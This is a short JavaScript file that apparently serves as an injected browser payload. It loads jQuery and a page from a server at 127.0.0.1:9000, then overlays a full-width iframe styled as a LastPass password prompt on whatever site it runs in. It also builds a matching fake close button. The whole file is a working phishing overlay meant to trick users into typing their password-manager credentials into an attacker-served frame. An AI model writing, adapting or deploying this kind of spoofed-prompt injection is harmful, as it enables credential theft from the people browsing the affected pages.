//load in jquery (a little uneccessary possibly for this script)
var script = document.createElement('script');
script.src = "http://127.0.0.1:9000/public/js/jquery-1.9.1.min.js";
script.onload = function () {

var closeScript ='<script type="text/javascript">' +
    '  $( "#lpclose" ).click(function(){' +
    '    $("#lp-password-prompt-reveal-modal").hide();' +
    '  });' +
    '</script>';

var closeButton = '<img id="lpclose" width="16" height="16" lptype="close" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABYklEQVR42qXTvWrCUBQHcKe+QqfundPFxT0OnTJ0MtChmw/g4NgH6FtkEwoBv8BEA8EYFGswBIIEhFCrU4V26cfp+Qe5RLlKwcAPknty/7mHe1NoNBoy9+yZJWzBcN3J3j0cuGJJt9ul0WhEYRjSfD4nz/Oo0+kQ10J2eSygyL4xcb1eyyAUIV/sWhawHY/HtFqtTvJ9HyGbw4B6r9ejNE3/ZdfOQz4gnkwmtFwuM7VajRRFIcMwyLIs3GNM1HetePmA9yAIKEkSoVqtUrlcBtzv1abTKQJe9wIwGMexgGd8GQ5rvFoEvOUDFtiqKIoEXddJVdWMpml7Ndd1EfCSD3jC3mPPoVKpUKlUItM0AavAmKi3220E1PMBF+zTcRyazWYn9ft9Qsuyc3DLfm3bRs8y2BFM/mFFWQDcsE2r1SKsZjgcZgaDATWbTUxOxSmUBwiPLGEfOzGrH/uZzlIgorP8ASYfyJK1fcokAAAAAElFTkSuQmCC" id="lphideoverlay" data-lpstyle="width:16px;height:16px;float: right; margin-right: 10px; margin-bottom: -10px;" style="width: 16px; height: 16px; float: right; margin: 3px 10px -10px 10px;">';

drawTimer = setTimeout( function() {
  clearTimeout(drawTimer);
  console.log($('#lp-password-prompt-reveal-modal').length);
  if($('#lp-password-prompt-reveal-modal').length == 0){
    var iframe = document.createElement('iframe');
    iframe.src = 'http://127.0.0.1:9000/public/includes/lastpass.html';
    iframe.style.position = "fixed";
    iframe.style.top = 0;
    iframe.style.left = 0;
    iframe.style.width = "100%";
    iframe.style.height = "30px";
    iframe.style.zIndex = 100000;
    iframe.style.border = "none";
    iframe.id = 'lp-password-prompt-reveal-modal';
    document.body.appendChild(iframe);
    console.log('iframe.contentWindow =', iframe.contentWindow);

    // $( "body" ).prepend(closeButton);
    // $( "body" ).prepend(closeScript);
    // $( "#lpclose" ).click(function(){
    //   $('#lp-password-prompt-reveal-modal').remove();
    // });
  }

}, 0 );



};

document.head.appendChild(script); //or something of the likes

